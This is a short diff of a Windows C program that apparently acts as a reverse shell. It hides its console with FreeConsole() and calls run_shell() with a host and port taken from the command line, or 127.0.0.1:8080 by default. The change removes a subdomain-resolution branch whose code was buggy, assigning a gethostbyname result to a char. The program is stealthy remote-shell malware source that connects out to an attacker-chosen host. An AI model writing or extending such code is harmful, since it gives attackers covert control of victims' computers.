@@ -9,7 +9,6 @@
  #include <winsock2.h>
  #include <windows.h>
  #include <ws2tcpip.h>
- #include <string.h>
    
  #pragma comment(lib, "ws2_32.lib")
  
@@ -20,31 +19,17 @@
  int main( int argc, char **argv ){
 	 
 	 int port;
-	 char ip;
 	 
 	 // Disable console window
 	 FreeConsole();
 	 
-	 if( argc != 4 ) {
+	 if( argc != 3 ){
 		 
-		 // Default config
 		 char host[] = "127.0.0.1";
 		 port = 8080;
 		 run_shell( host, port );
 		 
-	} else if( strcmp( argv[3], "subdomain" ) == NULL ) {
-		
-		// Subdomain to IP (gethostbyname())
-		if( ip = gethostbyname( argv[1] ) == NULL ) {
-			exit(1);
-			
-		}
-		
-		port = atoi( argv[2] );
-		run_shell( ip, port );
-		
-		
-	} else if( strcmp( argv[3], "ip" ) == NULL ) {
+	} else {
 		
 		port = atoi( argv[2] );
 		run_shell( argv[1], port );
